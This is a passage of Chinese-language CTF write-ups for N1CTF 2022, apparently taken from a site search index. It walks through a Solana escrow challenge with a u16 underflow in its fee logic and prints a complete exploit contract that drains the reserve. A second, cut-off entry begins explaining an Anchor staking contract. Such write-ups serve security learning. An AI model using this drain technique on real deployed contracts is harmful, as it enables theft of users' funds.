\u8fd8\u662f\u6709\u5f88\u591a\u9700\u8981\u4e86\u89e3\u7684\u57fa\u7840\u77e5\u8bc6\u8fd8\u662f\u5f88\u591a\u7684\uff0c\u6709\u65f6\u95f4\u4ee5\u540e\u7cfb\u7edf\u5b66\u4e60\u7684\u65f6\u5019\u518d\u8bb0\u5f55\u5427</p>"}, {"location": "writeups/n1ctf2022/#utility-payment-service", "title": "Utility Payment Service", "text": "<p>solana \u7684\u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\u5f88\u590d\u6742\uff0c\u9644\u4ef6\u4e5f\u662f\u5b8c\u6574\u7684 cargo \u5de5\u4f5c\u533a\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u5168\u5217\u51fa\u6765\u4e86\u3002</p> processor \u90e8\u5206 <pre><code>use borsh::{BorshDeserialize, BorshSerialize};\n\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    pubkey::Pubkey,\n    system_instruction,\n};\n\nuse crate::{Escrow, ServiceInstruction, ESCROW_ACCOUNT_SIZE};\n\npub fn process_instruction(\n    program: &amp;Pubkey,\n    accounts: &amp;[AccountInfo],\n    mut data: &amp;[u8],\n) -&gt; ProgramResult {\n    match ServiceInstruction::deserialize(&amp;mut data)? {\n        ServiceInstruction::Init {} =&gt; init_escrow(program, accounts),\n        ServiceInstruction::DepositEscrow { amount } =&gt; deposit_escrow(program, accounts, amount),\n        ServiceInstruction::WithdrawEscrow {} =&gt; withdraw_escrow(program, accounts),\n        ServiceInstruction::Pay { amount } =&gt; pay_utility_fees(program, accounts, amount),\n    }\n}\n\npub fn get_escrow(program: Pubkey, user: Pubkey) -&gt; (Pubkey, u8) {\n    Pubkey::find_program_address(&amp;[\"ESCROW\".as_bytes(), &amp;user.to_bytes()], &amp;program)\n}\n\npub fn get_reserve(program: Pubkey) -&gt; (Pubkey, u8) {\n    Pubkey::find_program_address(&amp;[\"RESERVE\".as_bytes()], &amp;program)\n}\n\n\n///\n/// init escrow\n///\nfn init_escrow(program: &amp;Pubkey, accounts: &amp;[AccountInfo]) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let _reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    assert!(escrow_account.data_is_empty());\n    let (expected_escrow, escrow_bump) = get_escrow(*program, *user.key);\n\n    invoke_signed(\n    &amp;system_instruction::create_account(\n        &amp;user.key,\n        &amp;expected_escrow,\n        1,\n        ESCROW_ACCOUNT_SIZE as u64,\n        &amp;program,\n    ),\n    &amp;[user.clone(), escrow_account.clone(), sys_prog.clone()],\n    &amp;[&amp;[\"ESCROW\".as_bytes(), &amp;user.key.to_bytes(), &amp;[escrow_bump]]],\n    )?;\n\n    let escrow_data = Escrow {\n        user: *user.key,\n        amount: 0,\n        bump: escrow_bump,\n    };\n\n    escrow_data.serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..]).unwrap();\n\n    Ok(())\n}\n\n///\n/// deposit escrow\n///\nfn deposit_escrow(\n    program: &amp;Pubkey,\n    accounts: &amp;[AccountInfo],\n    deposit_amount: u16,\n) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    let (expected_reserve, _reserve_bump) = get_reserve(*program);\n    assert_eq!(expected_reserve, *reserve.key);\n    let (expected_escrow, _escrow_bump) = get_escrow(*program, *user.key);\n    assert_eq!(expected_escrow, *escrow_account.key);\n\n    invoke(\n        &amp;system_instruction::transfer(&amp;user.key, &amp;reserve.key, deposit_amount as u64),\n        &amp;[\n            user.clone(),\n            reserve.clone(),\n            sys_prog.clone()\n        ],\n    )?;\n\n    let escrow_data = &amp;mut Escrow::deserialize(&amp;mut &amp;(*escrow_account.data).borrow_mut()[..])?;\n    escrow_data.amount += deposit_amount;\n    escrow_data\n        .serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\n///\n/// withdraw all balance in escrow\n///\nfn withdraw_escrow(program: &amp;Pubkey, accounts: &amp;[AccountInfo]) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    let (expected_reserve, reserve_bump) = get_reserve(*program);\n    assert_eq!(expected_reserve, *reserve.key);\n    let (expected_escrow, _escrow_bump) = get_escrow(*program, *user.key);\n    assert_eq!(expected_escrow, *escrow_account.key);\n\n    let escrow_data = &amp;mut Escrow::deserialize(&amp;mut &amp;(*escrow_account.data).borrow_mut()[..])?;\n    let balance = escrow_data.amount;\n    invoke_signed(\n        &amp;system_instruction::transfer(&amp;reserve.key, &amp;user.key, balance as u64),\n        &amp;[user.clone(), reserve.clone(), sys_prog.clone()],\n        &amp;[&amp;[\"RESERVE\".as_bytes(), &amp;[reserve_bump]]],\n    )?;\n\n    escrow_data.amount = 0;\n    escrow_data\n        .serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\n///\n/// pay utility\n///\nfn pay_utility_fees(program: &amp;Pubkey, accounts: &amp;[AccountInfo], amount: u16) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let _sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    let (expected_reserve, _reserve_bump) = get_reserve(*program);\n    assert_eq!(expected_reserve, *reserve.key);\n    let (expected_escrow, _escrow_bump) = get_escrow(*program, *user.key);\n    assert_eq!(expected_escrow, *escrow_account.key);\n\n    let escrow_data = &amp;mut Escrow::deserialize(&amp;mut &amp;(*escrow_account.data).borrow_mut()[..])?;\n\n    let base_fee = 15_u16;\n    if escrow_data.amount &gt;= 10 {\n        if amount &lt; base_fee {\n            escrow_data.amount -= base_fee;\n        } else {\n            assert!(escrow_data.amount &gt;= amount);\n            escrow_data.amount -= amount;\n        }\n    } else {\n        msg!(\"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\");\n    }\n\n    escrow_data\n        .serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u4e3b\u8981\u6709\u4e09\u4e2a\u65b9\u6cd5\uff1a</p> <ul> <li>Init\uff1a\u521d\u59cb\u5316\u5e76\u7b7e\u540d escrow</li> <li>DepositEscrow\uff1a\u5b58\u5165 deposit_amount \u91d1\u989d<ul> <li>\u5c06\u94b1\u8f6c\u5165 reserve account\uff08\u53ea\u7531 program seed \u751f\u6210\uff09</li> <li>\u5c06\u7528\u6237\u5bf9\u5e94 escrow account\uff08\u7531 program \u548c user.key \u7684 seed \u5408\u6210\u751f\u6210\uff09\u7684 amount \u589e\u52a0 deposit_amout</li> </ul> </li> <li>WithdrawEscrow\uff1a\u5c06 escrow \u8bb0\u5f55\u7684\u6240\u6709\u91d1\u989d\u90fd\u8f6c\u56de\u7ed9\u7528\u6237<ul> <li>\u4ece reserve account \u8f6c\u51fa</li> </ul> </li> <li>Pay\uff1a\u652f\u4ed8\uff0c\u4e5f\u5c31\u662f\u51cf\u5c11\u7528\u6237 escrow \u7684 amount\u3002\u8fd8\u662f\u770b\u4ee3\u7801\u66f4\u6e05\u6670\uff1a     <pre><code>let base_fee = 15_u16;\nif escrow_data.amount &gt;= 10 {\n    if amount &lt; base_fee {\n        escrow_data.amount -= base_fee;\n    } else {\n        assert!(escrow_data.amount &gt;= amount);\n        escrow_data.amount -= amount;\n    }\n} else {\n    msg!(\"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\");\n}\n</code></pre></li> </ul> <p>\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u9690\u60a3\u662f u16\uff0c\u4e5f\u5c31\u662f 16 \u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u3002\u518d\u56de\u5934\u770b lib.rs \u4e2d\u89c4\u5b9a\u7684 Escrow account \u7ed3\u6784\u4f53\uff1a <pre><code>#[repr(C)]\n#[derive(BorshSerialize, BorshDeserialize)]\npub struct Escrow {\n    pub user: Pubkey,\n    pub amount: u16,\n    pub bump: u8,\n}\n</code></pre> \u8fd9\u91cc\u7684 amount \u4e5f\u662f u16\uff0c\u5b58\u5728\u6574\u578b\u6ea2\u51fa\u98ce\u9669\u3002</p> <p>\u63a5\u7740\u770b main.rs \u4e2d\u7684\u9898\u76ee\u90e8\u5206\uff1a</p> \u9898\u76ee\u4ea4\u4e92\u90e8\u5206 <pre><code>fn handle_connection(mut socket: TcpStream) -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {\n    let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap();\n\n    // load programs\n    let solve_pubkey = builder.input_program().unwrap();\n    let program_pubkey = builder.chall_programs(&amp;[\"./utility_payment.so\"])[0];\n\n    // make user\n    let user = Keypair::new();\n\n    writeln!(socket, \"program pubkey: {}\", program_pubkey)?;\n    writeln!(socket, \"solve pubkey: {}\", solve_pubkey)?;\n    writeln!(socket, \"user pubkey: {}\", user.pubkey())?;\n\n    // println!(\"program: {}\", program_pubkey);\n\n    // add accounts and lamports\n    let (reserve, _) = get_reserve(program_pubkey);\n    // let (escrow, _) =  get_escrow(program_pubkey, user.pubkey());\n\n    const TARGET_AMT: u64 = 60_000;\n    const INIT_BAL: u64 = 50;\n    const RESERVE_BAL: u64 = 1_000_000;\n\n    builder\n        .builder\n        .add_account_with_lamports(user.pubkey(), system_program::ID, INIT_BAL);\n    builder\n        .builder\n        .add_account_with_lamports(reserve, system_program::ID, RESERVE_BAL);\n\n    let mut challenge = builder.build();\n\n    let balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\n    writeln!(socket, \"user lamport before: {:?}\", balance)?;\n\n    // run solve\n    challenge.input_instruction(solve_pubkey, &amp;[&amp;user]).unwrap();\n\n    // check solve\n    let balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\n    writeln!(socket, \"user lamport after: {:?}\", balance)?;\n\n    if balance &gt; TARGET_AMT {\n        let flag = fs::read_to_string(\"flag.txt\").unwrap();\n        writeln!(\n            socket,\n            \"Flag: {}\",\n            flag\n        )?;\n    }\n\n    Ok(())\n}\n</code></pre> <p>\u7b2c\u4e00\u6b21\u63a5\u89e6 solana \u9898\u76ee\uff0c\u6240\u4ee5\u9010\u6b65\u89e3\u6790\u4e00\u4e0b\uff1a</p> <ul> <li>\u521b\u5efa\u4e00\u4e2a builder \u5e76\u83b7\u53d6\u7528\u6237\u5408\u7ea6\u4ee5\u53ca\u9898\u76ee\u5408\u7ea6\uff08ChallengeBuilder \u6765\u81ea sol-ctf-framework\uff09\uff1a     <pre><code>let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap();\n\n// load programs\nlet solve_pubkey = builder.input_program().unwrap();\nlet program_pubkey = builder.chall_programs(&amp;[\"./utility_payment.so\"])[0];\n</code></pre><ul> <li>\u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u662f\u4e00\u4e2a solana \u5408\u7ea6\u5728\u4e0a\u94fe\u7684\u65f6\u5019\u9700\u8981\u7f16\u8bd1\u6210 BPF\uff08Berkley Packer Filter\uff09\u5b57\u8282\u7801\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a .so \u6587\u4ef6</li> <li>ChallengeBuilder::input_program \u65b9\u6cd5\u53ef\u4ee5\u901a\u8fc7\u6e90\u7801\u770b\u51fa\u9996\u5148\u8f93\u5165\u7a0b\u5e8f\u957f\u5ea6\uff0c\u7136\u540e\u8bfb\u53d6 .so \u7684\u5b57\u8282\u5e8f\u5217</li> </ul> </li> <li>\u521b\u5efa\u7528\u6237\u8d26\u6237\u5e76\u8f93\u51fa\u4e00\u7cfb\u5217 pubkey\uff1a     <pre><code>let user = Keypair::new();\n\nwriteln!(socket, \"program pubkey: {}\", program_pubkey)?;\nwriteln!(socket, \"solve pubkey: {}\", solve_pubkey)?;\nwriteln!(socket, \"user pubkey: {}\", user.pubkey())?;\n</code></pre></li> <li>\u6839\u636e program_pubkey \u6765\u627e\u5230 reserve \u8d26\u6237\uff1a     <pre><code>let (reserve, _) = get_reserve(program_pubkey);\n</code></pre><ul> <li>\u5176\u4e2d get_reserve \u51fd\u6570\u5728 processor.rs \u4e2d\u5b9a\u4e49\uff1a     <pre><code>pub fn get_reserve(program: Pubkey) -&gt; (Pubkey, u8) {\n    Pubkey::find_program_address(&amp;[\"RESERVE\".as_bytes()], &amp;program)\n}\n</code></pre></li> <li>\u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u4e00\u4e2a\u662f solana \u7684\u8d26\u6237\u5206\u4e3a\u4e00\u822c\u8d26\u6237\u548c PDA\uff08Program Derived Address\uff09<ul> <li>PDA \u4e00\u822c\u662f\u7531\u7a0b\u5e8f\u751f\u6210\u7528\u6765\u8bb0\u5f55\u6570\u636e\u7684</li> <li>PDA \u7684\u8ba1\u7b97\u662f\u6839\u636e seed \u548c program_id\uff08\u4e5f\u5c31\u662f\u7a0b\u5e8f\u7684 pubkey\uff09\u505a\u54c8\u5e0c\u6765\u751f\u6210\u7684</li> <li>\u4f46\u662f PDA \u8981\u4fdd\u8bc1\u4e0d\u662f\u53ef\u7528\u7684 Pubkey\uff08\u8fd9\u4e2a\u8fd8\u6ca1\u7406\u89e3\uff09\uff0c\u6240\u4ee5 hash \u7684\u65f6\u5019\u8981\u518d\u52a0\u4e00\u4e2a\u53c2\u6570 bump\uff1apda = hash(seed, bump, program_id)</li> <li>\u5bfb\u627e\u4e00\u4e2a PDA \u7684\u65f6\u5019\u4f1a\u4ece 0 \u5230 256 \u679a\u4e3e bump\uff0c\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u751f\u6210\u6709\u6548 PDA \u7684 bump \u79f0\u4e3a canonical bump\uff0c\u800c\u4e14\u4e00\u822c\u5c31\u4f7f\u7528\u8fd9\u4e2a PDA</li> <li>\u6240\u4ee5\u6839\u636e\u76f8\u540c seed\u3001\u76f8\u540c program_id \u751f\u6210\u7684 PDA \u4e5f\u662f\u76f8\u540c\u7684\u3002Pubkey::find_program_address \u505a\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f seed\u3001\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f program_id</li> </ul> </li> <li>\u6240\u4ee5 reserve \u662f\u4e00\u4e2a\u7531 RESERVE seed \u548c program_pubkey \u751f\u6210\u7684 PDA</li> </ul> </li> <li>\u4e3a account \u589e\u52a0\u521d\u59cb lamports\uff08\u94b1\uff09\uff1a     <pre><code>const TARGET_AMT: u64 = 60_000;\nconst INIT_BAL: u64 = 50;\nconst RESERVE_BAL: u64 = 1_000_000;\n\nbuilder\n    .builder\n    .add_account_with_lamports(user.pubkey(), system_program::ID, INIT_BAL);\nbuilder\n    .builder\n    .add_account_with_lamports(reserve, system_program::ID, RESERVE_BAL);\n</code></pre><ul> <li>\u7ed9 user 50 lamports</li> <li>\u7ed9 reserve 1000000 lamports</li> </ul> </li> <li>\u6784\u5efa challenge\u3001\u8f93\u51fa user \u521d\u59cb lamports\uff1a     <pre><code>let mut challenge = builder.build();\n\nlet balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\nwriteln!(socket, \"user lamport before: {:?}\", balance)?;\n</code></pre></li> <li>\u63a5\u6536\u6307\u4ee4\uff0c\u4ea4\u7ed9\u7528\u6237\u5408\u7ea6\u6267\u884c\uff1a     <pre><code>challenge.input_instruction(solve_pubkey, &amp;[&amp;user]).unwrap();\n</code></pre><ul> <li>\u8fd9\u91cc\u7684 input_instruction \u65b9\u6cd5\u4e5f\u662f\u5728 sol-ctf-framework \u4e2d\u5b9a\u4e49\u7684\uff0c\u8f93\u5165\u65b9\u6cd5\u8f83\u590d\u6742\uff0c\u4e0d\u8fc7\u597d\u5728\u9898\u76ee\u63d0\u4f9b\u4e86\u4e00\u4e2a solve.py \u7528\u6765\u4ea4\u4e92\u8f93\u5165\u6307\u4ee4</li> </ul> </li> <li>\u68c0\u67e5\u76ee\u6807\uff0c\u8fbe\u5230\u5219\u4e0b\u53d1 flag\uff1a     <pre><code>let balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\nwriteln!(socket, \"user lamport after: {:?}\", balance)?;\n\nif balance &gt; TARGET_AMT {\n    let flag = fs::read_to_string(\"flag.txt\").unwrap();\n    writeln!(\n        socket,\n        \"Flag: {}\",\n        flag\n    )?;\n}\n</code></pre><ul> <li>\u53ef\u89c1\u76ee\u6807\u662f\u4f7f user \u62e5\u6709\u7684 lamports \u5927\u4e8e 60000 lamports</li> </ul> </li> </ul> <p>\u8fd9\u6837\u6211\u4eec\u7684\u653b\u51fb\u65b9\u5f0f\u5c31\u5f88\u660e\u663e\u4e86\uff1a</p> <ul> <li>\u5148\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Init \u6307\u4ee4\u5b8c\u6210\u521d\u59cb\u5316\uff08\u9898\u76ee\u5df2\u7ecf\u5199\u597d\uff09</li> <li>\u518d deposit 11 lamports\uff0c\u4f7f\u7528\u6237\u5bf9\u5e94\u7684 escrow \u7684 amount \u8bb0\u4e3a 11</li> <li>\u7136\u540e pay 11 lamports\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u6536\u53d6 11 lamports \u800c\u662f\u6536\u53d6\u57fa\u7840\u8d39\u7528 15 lamports\u3002escrow \u7684 amount \u4ece 11 \u51cf\u53bb 15 \u53d1\u751f\u6ea2\u51fa\uff0c\u6ea2\u51fa\u5230 65531\uff0c\u6b64\u65f6 withdraw \u7684\u8bdd reserve \u6709 1000000 \u8db3\u591f\u652f\u4ed8\uff0c\u63d0\u51fa\u6765\u540e\u4e5f\u53ef\u4ee5\u8fbe\u5230\u9898\u76ee 60000 \u7684\u76ee\u6807</li> <li>\u76f4\u63a5 withdraw \u5373\u53ef</li> </ul> <p>\u6240\u4ee5\u53ea\u9700\u8981\u5c06\u8fd9\u4e9b\u6b65\u9aa4\u90fd\u7167\u846b\u82a6\u753b\u74e2\u5199\u5728 processor.rs \u7684 process_instruction \u4e2d\u5373\u53ef\uff1a</p> exp \u5408\u7ea6 <pre><code>pub fn process_instruction(\n    _program: &amp;Pubkey,\n    accounts: &amp;[AccountInfo],\n    _data: &amp;[u8],\n) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n    let utility_program = next_account_info(account_iter)?;\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog_account = next_account_info(account_iter)?;\n\n    invoke(\n        &amp;Instruction {\n            program_id: *utility_program.key,\n            accounts: vec![\n                AccountMeta::new(*user.key, true),\n                AccountMeta::new(*reserve.key, false),\n                AccountMeta::new(*escrow_account.key, false),\n                AccountMeta::new_readonly(system_program::id(), false),\n            ],\n            data: ServiceInstruction::Init { }\n                .try_to_vec()\n                .unwrap(),\n        },\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],\n    )?;\n\n    invoke(\n        &amp;deposit_escrow(\n            *utility_program.key, \n            *user.key, \n            *reserve.key, \n            *escrow_account.key, \n            11,\n        ),\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],\n    )?;\n\n    invoke(\n        &amp;pay_utility_fees(\n            *utility_program.key, \n            *user.key, \n            *reserve.key, \n            *escrow_account.key, \n            11,\n        ),\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],        \n    )?;\n\n    invoke(\n        &amp;withdraw_escrow(\n            *utility_program.key,\n            *user.key,\n            *reserve.key,\n            *escrow_account.key,\n        ),\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],\n    )?;\n\n    Ok(())\n}\n</code></pre> <p>\u4e4b\u540e\u5229\u7528 cargo build-bpf\uff08\u9700\u8981\u5148\u5b89\u88c5 solana\uff09\u7f16\u8bd1\u51fa .so \u6587\u4ef6\uff0c\u518d\u4ea4\u7ed9 solve.py \u811a\u672c\u4ea4\u9898\u5373\u53ef\u3002</p> <p>flag: n1ctf{cashback_\u2026\u2026}</p>"}, {"location": "writeups/n1ctf2022/#simple-staking", "title": "Simple Staking", "text": "<p>\u540c\u6837\u4e5f\u662f solana \u5408\u7ea6\uff0c\u4e0d\u8fc7\u7528\u4e86 anchor lang\uff1ahttps://www.anchor-lang.com/ \uff0c\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u5199\u6cd5\uff0c\u4f46\u770b\u770b\u6587\u6863\u8fd8\u633a\u597d\u61c2\u7684</p> <p>\u8fd8\u662f\u8be6\u7ec6\u89e3\u6790\u4e00\u4e0b\uff1a</p>"}, {"location": "writeups/n1ctf2022/#_1", "title": "\u9898\u76ee\u5408\u7ea6", "text": "<p>anchor lang \u7684\u8bed\u6cd5\u770b\u8d77\u6765\u5c31\u662f\u628a\u5904\u7406\u51fd\u6570\u5c01\u88c5\u5728\u4e00\u4e2a mod \u4e2d\u7136\u540e\u7528 <code>#[program]</code> \u5b8f\u6765\u5904\u7406\u3002</p> <p>\u8fd9\u4e2a mod \u4e2d\u7684\u6bcf\u4e2a\u51fd\u6570\u90fd\u4f1a\u88ab\u5904\u7406\u6210\u4e00\u4e2a\u6307\u4ee4\uff0c\u5b83\u4eec\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u662f\u4e00\u4e2a Context \u6cdb\u578b\uff0c\u5176\u4f9d\u8d56\u7684\u662f\u9488\u5bf9\u6bcf\u79cd\u6307\u4ee4\u7684\u7ed3\u6784\u4f53 Accounts\uff08\u5373 Context\uff09\uff0c\u7136\u540e\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u5229\u7528 ctx.accounts.? \u6765\u83b7\u53d6\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u7684\u5404\u4e2a account\u3002 <p>\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u4f1a\u4f7f\u7528 <code>#[derive(Accounts)]</code> \u5b8f\u6765\u8fdb\u884c\u5904\u7406\u3002\u5176\u4e2d\u6210\u5458\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>#[account()]</code> \u5b8f\u8fdb\u884c\u9650\u5b9a\uff0c\u5982\u679c\u8f93\u5165\u4e0d\u6ee1\u8db3\u9650\u5b9a\u5219\u4f1a\u62a5\u9519\uff0c\u5177\u4f53\u5199\u6cd5\u548c\u610f\u4e49\u53ef\u4ee5\u770b\u5b98\u65b9\u6587\u6863\u3002</p>"}, {"location": "writeups/n1ctf2022/#initialize", "title": "Initialize", "text": "<ul> <li>\u5904\u7406\u51fd\u6570\u662f\u7a7a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u6240\u6709\u64cd\u4f5c\u90fd\u5728 Initialize \u7ed3\u6784\u4f53\u4e2d\u8fdb\u884c     <pre><code>pub fn initialize(_ctx: Context&lt;Initialize&gt;) -&gt; Result&lt;()&gt; {\n    Ok(())\n}\n</code></pre></li> <li>Initialize \u7ed3\u6784\u4f53\u5b57\u6bb5\uff1a<ul> <li>catalog\uff1a     <pre><code>#[account(\n    init,\n    seeds = [ b\"CATALOG\" ],\n    bump,   \n    payer = payer,\n    space = Catalog::SIZE,\n)]\npub catalog: Account&lt;'info, Catalog&gt;,\n</code></pre><ul> <li>init \u8868\u793a\u8fd9\u4e2a account \u9700\u8981\u521d\u59cb\u5316\uff08\u800c\u4e14\u4e0d\u80fd\u91cd\u590d\u8fdb\u884c\uff09</li> <li>seeds \u8868\u793a\u7528\u8fd9\u4e2a seed \u6765\u627e PDA</li> <li>bump \u8868\u793a\u8981\u8bb0\u5f55\u4e0b canonical bump\uff08\u53ef\u4ee5\u901a\u8fc7 <code>*ctx.bumps.get(\"catalog\").unwrap()</code> \u6765\u83b7\u53d6\u8fd9\u4e2a bump</li> <li>payer \u8868\u793a\u521b\u5efa\u8d26\u53f7\u8981\u7528\u7684 payer</li> <li>space \u7528\u6765\u786e\u5b9a\u5927\u5c0f\uff0c\u7531 Catalog \u89c4\u5b9a</li> <li>\u8fd9\u4e2a\u8d26\u6237\u5b58\u7684\u4fe1\u606f\uff08data\uff09\u662f Catalog \u7ed3\u6784\u4f53\u7684\u5185\u5bb9\uff08\u5e8f\u5217\u5316\u540e\uff09Catalog \u5b9a\u4e49\uff1a     <pre><code>#[account]\n#[repr(C, align(8))]\n#[derive(Default)]\npub struct Catalog {\n    pub orgs: Vec&lt;String&gt;,\n    pub ids: Vec&lt;String&gt;,\n}\nimpl Catalog {\n    pub const SIZE : usize = 8 \n        + 4 + (4 + MAXIMUM_STRING_SIZE) * MAXIMUM_CATALOG_SIZE   // orgs: Vec&lt;String&gt;,\n        + 4 + (4 + MAXIMUM_STRING_SIZE) * MAXIMUM_CATALOG_SIZE;  //  ids: Vec&lt;String&gt;,\n}\n</code></pre></li> </ul> </li> <li>reserve\uff1a     <pre><code>#[account(\n    init,\n    seeds = [ b\"RESERVE\" ],\n    bump,\n    payer = payer,\n    token::mint = mint,\n    token::authority = reserve\n)]\npub reserve: Account&lt;'info, TokenAccount&gt;,\n</code></pre><ul> <li>\u4e0e\u524d\u9762\u540c\u7406</li> <li>\u8fd9\u662f\u4e00\u4e2a TokenAccount\uff0c\u5176\u5b9a\u4e49\u5728 spl_token \u4e2d\uff0c\u662f\u4e00\u4e2a\u7c7b\u4f3c ERC20 \u7684\u4ee3\u5e01</li> </ul> </li> <li>\u5176\u5b83\uff1a     <pre><code>pub mint: Account&lt;'info, Mint&gt;,\n\n#[account(mut)]\npub payer: Signer&lt;'info&gt;,\npub token_program: Program&lt;'info, Token&gt;,\npub system_program: Program&lt;'info, System&gt;,\npub rent: Sysvar&lt;'info, Rent&gt;,\n</code></pre><ul> <li>mint \u4e3a Token \u5408\u7ea6\u7684 mint \u8d26\u6237\uff0c\u7528\u6765\u7ed9 reserve \u63d0\u4f9b\u53c2\u6570 token::mint</li> <li>payer \u4e5f\u662f\u4e3a\u524d\u9762\u4e24\u4e2a\u63d0\u4f9b\u53c2\u6570</li> <li>token_program \u662f spl token \u7684 ID</li> <li>system_program \u662f\u9898\u76ee\u5408\u7ea6\u7684 ID</li> <li>rent \u662f solana \u7cfb\u7edf\u7684 rent ID\uff08\u4e0d\u7528\u7ba1\u8fd9\u4e2a\uff09</li> </ul> </li> </ul> </li> </ul>"}, {"location": "writeups/n1ctf2022/#register", "title": "Register", "text": "<ul> <li>Register \u7ed3\u6784\u4f53\uff1a<ul> <li>catalog\uff1a     <pre><code>#[account(\n    mut,\n    seeds = [ b\"CATALOG\" ],\n    bump\n)]\npub catalog: Account&lt;'info, Catalog&gt;,\n</code></pre><ul> <li>\u6839\u636e\u8fd9\u4e2a seed \u6765\u83b7\u53d6\uff0c\u540c\u6837\u8bb0\u5f55 bump</li> </ul> </li> <li>employee_record\uff1a     <pre><code>#[account(\n    init,\n    seeds = [user.key().as_ref()],\n    bump,\n    payer = user,\n    space = EmployeeRecord::SIZE,\n)]\npub employee_record: Account&lt;'info, EmployeeRecord&gt;,\n</code></pre><ul> <li>\u548c\u524d\u9762 Initialize \u7684\u540c\u7406</li> <li>\u5176\u4e2d EmployeeRecord \u7ed3\u6784\u4f53\uff1a     <pre><code>#[account]\n#[repr(C, align(8))]\n#[derive(Default)]\npub struct EmployeeRecord {\n    pub org: String,\n    pub id: String,\n    pub key: Pubkey,\n}\nimpl EmployeeRecord {\n    pub const SIZE : usize = 8 \n        + 4 + MAXIMUM_STRING_SIZE   // orgs: String,\n        + 4 + MAXIMUM_STRING_SIZE   //  ids: String,\n        + 32;                       //  key: Pubkey\n}\n</code></pre></li> </ul> </li> <li>\u5176\u5b83\uff1a     <pre><code>#[account(mut)]\npub user: Signer&lt;'info&gt;,\npub system_program: Program&lt;'info, System&gt;,\npub rent: Sysvar&lt;'info, Rent&gt;,\n</code></pre></li> </ul> </li> <li>\u5904\u7406\u51fd\u6570\uff1a     <pre><code>pub fn register(ctx: Context&lt;Register&gt;, org_name: String, employee_id: String) -&gt; Result&lt;()&gt; {\n    msg!(\"[CHALL] register: org {}, id {}\", org_name, employee_id);\n    require!(\n        org_name.len() &lt; MAXIMUM_STRING_SIZE,\n        CoreError::StringTooLong\n    );\n\n    require!(\n        employee_id.len() &lt; MAXIMUM_STRING_SIZE,\n        CoreError::StringTooLong\n    );\n\n    let catalog = &amp;mut ctx.accounts.catalog;\n    require!(\n        ! ( catalog.orgs.contains(&amp;org_name) &amp;&amp; catalog.ids.contains(&amp;employee_id) ),\n        CoreError::DuplicatedEmployee\n    );\n    catalog.orgs.push(org_name.clone());\n    catalog.ids.push(employee_id.clone());\n\n    let employee_record = &amp;mut ctx.accounts.employee_record;\n    let employee_key = ctx.accounts.user.key();\n    employee_record.org = org_name;\n    employee_record.id  = employee_id;\n    employee_record.key = 